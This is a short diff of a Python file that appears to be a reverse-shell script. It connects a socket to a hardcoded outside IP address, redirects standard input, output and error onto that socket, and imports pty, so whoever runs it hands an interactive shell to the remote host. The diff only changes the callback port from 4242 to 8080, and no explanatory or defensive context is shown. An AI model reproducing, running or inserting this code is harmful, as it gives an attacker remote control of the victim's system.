@@ -19,7 +19,7 @@ import os
 import pty
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("34.242.202.213",4242))
+s.connect(("34.242.202.213",8080))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
